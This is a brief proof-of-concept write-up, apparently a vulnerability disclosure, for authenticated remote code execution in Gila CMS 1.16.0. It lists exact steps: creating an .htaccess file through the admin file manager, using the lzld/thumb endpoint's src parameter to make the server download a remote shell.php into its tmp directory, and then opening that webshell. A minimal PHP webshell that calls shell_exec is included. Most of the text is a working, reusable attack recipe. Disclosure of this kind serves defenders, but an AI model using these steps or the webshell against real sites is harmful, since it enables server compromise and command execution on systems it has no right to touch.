# Gila-CMS-1.16.0-shell-upload
----
1.Login as administrator or any users have logs permission

2.Access to **http://IP/admin/fm?f=tmp/** . For example:
```http://192.168.0.105:1234/gila16/admin/fm?f=tmp/```

![title](Images/1.jpg)

3.Click **+File** and create **.htaccess**:

![title](Images/2.jpg)

4.Use this URL for downloading shell to gila's tmp directory **http://IP/lzld/thumb?size=600&src=SHELL_URL** .For example:
```http://192.168.0.105:1234/gila16/lzld/thumb?size=600&src=http://192.168.0.105:1234/files/shell.php```

5.We can check shell name with **http://IP/admin/fm?f=tmp/**

![title](Images/3.jpg)

6.Access to webshell and got RCE!

![title](Images/4.jpg)

----
## shell.php
```
<?php
$output = shell_exec('ipconfig');
echo "<pre>$output</pre>";
?>
```